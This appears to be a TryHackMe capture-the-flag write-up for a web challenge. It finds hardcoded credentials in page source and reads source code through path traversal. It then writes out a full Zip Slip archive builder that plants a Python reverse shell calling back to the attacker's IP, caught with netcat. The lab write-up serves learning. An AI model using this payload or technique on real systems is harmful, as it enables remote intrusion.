# THM - Hacker Holidays Day 10: The Hollow Shell
**Category:** Web
**Difficulty:** Medium

## Tools Used
- nmap
- firefox
- Python 3
- netcat

## Steps

1. Connected to TryHackMe VPN: `sudo openvpn thm.ovpn`
2. Ran `nmap -sC -sV <IP>` — found port 22 (SSH) and port 5000 (HTTP/Gunicorn)
3. Opened `http://<IP>:5000` in browser — found staff login page
4. Viewed page source — found hardcoded credentials in HTML comment: `concierge / StayNoticed2024!`
5. Logged in — found ZIP upload feature for "shell" souvenir packs
6. Read the dashboard — noted that uploaded shells are extracted server-side and automation hooks are processed by a background worker shortly after upload
7. Uploaded a test zip with a basic `shell.json` to confirm the upload works:
```bash
   echo '{"name":"test","assets":[]}' > shell.json
   zip test.zip shell.json
```
8. Fetched `app.py` via path traversal to read the source code:
   `curl --path-as-is "http://<IP>:5000/shells/../app.py"`
9. Confirmed the `extract_shell` function uses `os.path.join(shell_dir, name)` without sanitizing zip entry paths — classic Zip Slip vulnerability
10. Confirmed a `hooks/` directory exists at the app root and the worker auto-executes any `.py` file placed there
11. Noted tun0 IP: `ip a | grep tun0`
12. Built a malicious zip using Python — used path traversal entry `../../hooks/callback.py` to write a reverse shell into the hooks directory:
```python
    import zipfile, json
    manifest = {"name": "reverse", "assets": []}
    callback = """import socket, os, pty
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("<tun0_IP>", 4444))
    for fd in (0, 1, 2):
        os.dup2(sock.fileno(), fd)
    pty.spawn("/bin/bash")
    """
    with zipfile.ZipFile("reverse-shell.zip", "w") as z:
        z.writestr("shell.json", json.dumps(manifest))
        z.writestr("../../hooks/callback.py", callback)
```
13. Started listener: `nc -lvnp 4444`
14. Uploaded `reverse-shell.zip` — worker picked up `callback.py` from hooks directory and executed it
15. Got shell as `roomservice`
16. Found and read the flag: `cat /home/roomservice/flag.txt`

## What I Learned
- Always check HTML source before attempting brute force — hardcoded credentials are surprisingly common
- Zip Slip occurs when a server extracts zip archives without validating internal file paths — an entry named `../../etc/passwd` writes outside the intended directory
- Python's `os.path.join(base, name)` does not prevent path traversal for relative paths like `../../hooks/file.py` — developers must explicitly strip or validate paths before extraction
- A background worker that auto-executes files in a watched directory turns arbitrary file write into RCE
- Always verify your tun0 IP before building payloads — a changed IP silently breaks reverse shells
